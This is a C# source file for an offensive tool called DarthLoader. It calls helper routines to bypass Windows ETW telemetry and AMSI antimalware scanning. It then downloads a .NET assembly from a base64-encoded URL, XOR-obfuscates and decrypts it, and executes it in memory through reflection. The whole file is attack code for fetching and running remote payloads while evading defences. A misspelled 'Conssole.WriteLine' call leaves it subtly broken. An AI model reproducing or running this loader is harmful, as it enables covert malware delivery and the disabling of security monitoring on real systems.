using System.Net;
using System.Reflection;
using System;
using System.Threading;

namespace DarthLoader
{
    class Program
    {
        // download a .Net assembly and xor encrypt the bytes
        static byte[] PrepareRemoteAssembly(string url, string xorKey = "")
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient webClient = new WebClient();
            byte[] programBytes = null;
            int count = 3;

            while (count >= 0 && programBytes == null)
            {
                try
                {
                    programBytes = Utilities.Xor(webClient.DownloadData(url), xorKey);
                }
                catch (WebException)
                {
                    Console.WriteLine("[!] Assembly not found!");
                    Console.WriteLine($"[+] Retrying download...");
                    count--;
                    Thread.Sleep(2000);
                }
            }
            return programBytes;
        }

        // load, decrypt and execute assembly bytes
        static void ExecuteAssembly(byte[] programBytes)
        {
            try
            {
                Assembly dotNetProgram = Assembly.Load(programBytes);
                string[] parameters = new string[] { null }; // add params if needed
                dotNetProgram.EntryPoint.Invoke(null, new object[] { parameters });
            }
            catch (TargetInvocationException)
            {
                Console.WriteLine("[!] Missing arguments for loaded assembly!");
                Environment.Exit(-1);
            }
        }

        static void Main(string[] args)
        {
            string banner = @"
(                            (                                 
 )\ )                 )    )  )\ )              (               
(()/(      )  (    ( /( ( /( (()/(          )   )\ )   (   (    
 /(_))  ( /(  )(   )\()))\()) /(_))  (   ( /(  (()/(  ))\  )(   
(_))_   )(_))(()\ (_))/((_)\ (_))    )\  )(_))  ((_))/((_)(()\  
|   \ ((_)_  ((_)| |_ | |(_)| |    ((_)((_)_   _| |(_))   ((_) 
| |) |/ _` || '_||  _|| ' \ | |__ / _ \/ _` |/ _` |/ -_) | '_| 
|___/ \__,_||_|   \__||_||_||____|\___/\__,_|\__,_|\___| |_| 
                ";

            Console.WriteLine(banner);

            try
            {
                string key = args[0];
                string url = args[1];

                Utilities.BypassETW();
                Utilities.BypassAMSI();

                Console.WriteLine($"[*] Downloading and encrypting assembly with the key: {key}");
                byte[] programBytes = PrepareRemoteAssembly(Utilities.Base64Decode(url), key);

                if (programBytes == null)
                {
                    Console.WriteLine("[!] Assembly was not loaded. Exiting...");
                    Environment.Exit(-1);
                } else
                {
                    Console.WriteLine("[!] .Net assembly downloaded!");

                    Conssole.WriteLine("[+] Hit any key to run the assembly...");
                    Console.ReadKey();

                    Console.WriteLine("[*] Decrypting and executing assembly...");
                    ExecuteAssembly(Utilities.Xor(programBytes, key));
                }
            }
            catch(IndexOutOfRangeException)
            {
                // clean up
                Console.WriteLine("[!] Missing argument Xor key!");
                Environment.Exit(-1);
            }
        }
    }
}
